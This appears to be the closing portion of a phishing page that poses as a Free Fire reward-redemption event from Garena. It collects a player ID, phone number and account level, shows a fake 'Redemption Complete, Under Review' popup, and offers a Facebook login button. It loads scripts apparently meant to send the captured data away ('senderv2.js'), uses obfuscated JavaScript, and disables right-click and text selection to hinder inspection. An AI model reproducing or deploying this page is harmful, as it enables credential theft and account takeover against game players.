<input type="hidden" name="codetel" id="validateTel" readonly>
<label>Player ID</label>
<input type="number" name="playid" id="playid" placeholder="Enter your Player ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Player ID')" oninput="setCustomValidity('')">
<label>Phone Number</label>
<input type="number" name="phone" id="phone" placeholder="Enter your Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<label>Account Level</label>
<select style="margin-bottom:20px;" name="level" id="level" required oninvalid="this.setCustomValidity('Select your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Select your Account Level</option>
<script>
for (var lenzz = 1; lenzz <= 100; lenzz++) {
    document.write("<option>" + lenzz + "</option>");
};
</script>
</select>
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verification</button>
</div> <!--- popup-box-form-footer ---> </div>
</form> <!--- form --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Redemption Complete</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg-verify">
<div style="width:90%;margin-left:auto;margin-right:auto;">
<div class="popup-box-alert-left">
<p>Dear Players,</p>
Redemption for the item you selected was successful and FF Token Coin will be deducted automatically.
<p>We will also notify you in the mailbox when we have successfully dispatched your rewards.
<br>Please wait up to 1-2 days (48 Hours).</p>
</div>
<div class="popup-box-alert-line" style="width:96%;margin-top:-20px;"></div>
<div class="popup-box-alert-left" style="padding-left:7px;">
Current status: &ensp;<i class="fa-duotone fa-circle-dot fa-beat-fade" style="--fa-primary-color: #ff0000; --fa-secondary-color: #ff0000;"></i>&ensp;<a style="color:#89cff0;">Under Review</a></p>
</div> <!--- popup-box-alert-left --->
<div class="popup-box-form-footer" style="margin-top:-10px;">
<button type="button" onmousedown="tutup.play();" style="background-size: 100% 100%; margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/en/';">Home page</button>
</div>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="popup-box-navbar-login">
<div class="popup-box-navbar-login-title"></div> <!--- popup-box-navbar-login-title --->
</div> <!--- popup-box-navbar-login --->
<div class="popup-box-bg-login"><br><br><br><br><br><br><br><br>
<button type="button" class="popup-btn-login popup-btn-facebook" onmousedown="buka.play();" onclick="open_facebook();"><i class="fa-brands fa-square-facebook"></i>Facebook</button>
</div> <!--- popup-box-bg-login --->
<div class="popup-box-footer-login"></div> <!--- popup-box-footer-login --->
</div> <!--- popup-box --->
</div> <!--- popup account_login --->

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="lenzzjawa/script.js"></script>
<script src="lenzzjawa/scriptv2.js"></script>
<script src="lenzzjawa/senderv2.js"></script>
<script src="lenzzjawa/codeflag-link.js"></script>
<script src="lenzzjawa/slide-notif-zone.js"></script>
<script src="lenzzjawa/slide-header-zone.js"></script>
<script src="lenzzjawa/link.js"></script>
<script src="lenzzjawa/scriptv1.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
function openLenzzReward(evt, rewardsClass) {
    var i, item_reward, item_reward_link;
    item_reward = document.getElementsByClassName("item_reward");
    for (i = 0; i < item_reward.length; i++) {
        item_reward[i].style.display = "none";
    }
    item_reward_link = document.getElementsByClassName("lenzz-content");
    for (i = 0; i < item_reward_link.length; i++) {
        item_reward_link[i].className = item_reward_link[i].className.replace(" lenzz-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " lenzz-content-active";
}
document.getElementById("defaultreward").click();
</script>
<script>
function openloginlink(evt, loginlink) {
    var i, form_login, form_login_link;
    form_login = document.getElementsByClassName("form_login");
    for (i = 0; i < form_login.length; i++) {
        form_login[i].style.display = "none";        
    }
    form_login_link = document.getElementsByClassName("seclink-content");
    for (i = 0; i < form_login_link.length; i++) {
        form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
    }
    document.getElementById(loginlink).style.display = "block";
    evt.currentTarget.className += " seclink-content-active";
    
}
document.getElementById("email-login").click();
</script>
<script>
  function lenzzdrop(_0x2af79d) {
  var _0x1335ad = document.getElementById(_0x2af79d)
  _0x1335ad.play()
  $('.lenzz_airdrop').show()
  $('.once_confirmation').hide()
  const _0x3e00b7 = document.querySelector('video'),
    _0x494573 = document.querySelector('#idvidlenzz')
  _0x3e00b7.addEventListener('ended', (_0x4355a4) => {
    _0x494573.style.display = 'block'
    $('.lenzz_airdrop').fadeOut()
    $(document).trigger('function_lenzzdrop_complete')
  })
  $(document).bind('function_lenzzdrop_complete', audlenzz)
  $(document).bind('function_lenzzdrop_complete', lenzzflip)
  $(document).bind('function_lenzzdrop_complete', open_once_rewards)
  $(document).bind('function_lenzzdrop_complete', open_once_rewards_img)
}
function audlenzz() {
  let _0x19e55c = new Audio('lenzzmedia/lenzz.mp3')
  _0x19e55c.play()
}
function lenzzflip() {
  var _0x5869c8 = document.getElementById('flip')
  _0x5869c8.classList.add('flip')
}
function lenzzdrops(_0x325f3d) {
  var _0x5b5638 = document.getElementById(_0x325f3d)
  _0x5b5638.play()
  $('.lenzz_airdrop').show()
  $('.many_confirmation').hide()
  const _0x56355d = document.querySelector('video'),
    _0x132578 = document.querySelector('#idvidlenzz')
  _0x56355d.addEventListener('ended', (_0xd22aec) => {
    _0x132578.style.display = 'block'
    $('.lenzz_airdrop').fadeOut()
    $(document).trigger('function_lenzzdrop_complete')
  })
  $(document).bind('function_lenzzdrop_complete', audlenzz)
  $(document).bind('function_lenzzdrop_complete', lenzzflip1)
  $(document).bind('function_lenzzdrop_complete', open_many_rewards)
  $(document).bind('function_lenzzdrop_complete', open_many_rewards_img)
}
function lenzzflip1() {
  var _0x1ea852 = document.getElementById('flip1')
  _0x1ea852.classList.add('flip')
  var _0x1ea852 = document.getElementById('flip2')
  _0x1ea852.classList.add('flip')
  var _0x1ea852 = document.getElementById('flip3')
  _0x1ea852.classList.add('flip')
  var _0x1ea852 = document.getElementById('flip4')
  _0x1ea852.classList.add('flip')
  var _0x1ea852 = document.getElementById('flip5')
  _0x1ea852.classList.add('flip')
}
function open_account_login() {
  $('.account_login').show()
  $('.once_rewards').hide()
  $('.many_rewards').hide()
  $('.itemReward_confirmation').hide()
}
function close_itemReward_confirmation() {
  $('.itemReward_confirmation').hide()
}
function open_itemReward_confirmation(_0x20afe1) {
  var _0x4127f5 = $(_0x20afe1).attr('src'),
    _0x2df5a4 = $(_0x20afe1).attr('data-name'),
    _0x1c35eb = $(_0x20afe1).attr('data-id'),
    _0x2454cc = $(_0x20afe1).attr('value')
  $('.itemReward_confirmation').show()
  $('#myItemReward_confirmationImg').attr('src', _0x4127f5)
  $('#rewardName').html(_0x2df5a4)
  $('#amount').html(_0x1c35eb)
  $('#price').html(_0x2454cc)
}
function open_otherReward_confirmation(_0x353c7a) {
  var _0x63ee5c = $(_0x353c7a).attr('src'),
    _0x1c9418 = $(_0x353c7a).attr('value')
  $('.otherReward_confirmation').show()
  $('#myOtherReward_confirmationImg').attr('src', _0x63ee5c)
  $('#otherReward_confirmationValue').html(_0x1c9418)
}
function openRewards(_0x212057, _0x58b2d2) {
  var _0x3f8c2f, _0x81669d, _0x4ab5be
  _0x81669d = document.getElementsByClassName('tab_rewards')
  for (_0x3f8c2f = 0; _0x3f8c2f < _0x81669d.length; _0x3f8c2f++) {
    _0x81669d[_0x3f8c2f].style.display = 'none'
  }
  _0x4ab5be = document.getElementsByClassName('menu-content')
  for (_0x3f8c2f = 0; _0x3f8c2f < _0x4ab5be.length; _0x3f8c2f++) {
    _0x4ab5be[_0x3f8c2f].className = _0x4ab5be[_0x3f8c2f].className.replace(
      ' menu-content-active',
      ''
    )
  }
  document.getElementById(_0x58b2d2).style.display = 'block'
  _0x212057.currentTarget.className += ' menu-content-active'
}
document.getElementById('defaultTabRewards').click()
</script>
<script>
        // Right-click disable
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Disable text selection
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
        });

        // Disable dragging
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });

        // Disable long press on mobile
        document.addEventListener('touchstart', function(e) {
            if (e.touches.length > 1) {
                e.preventDefault();
            }
        }, { passive: false });
    </script>
</body>
</html>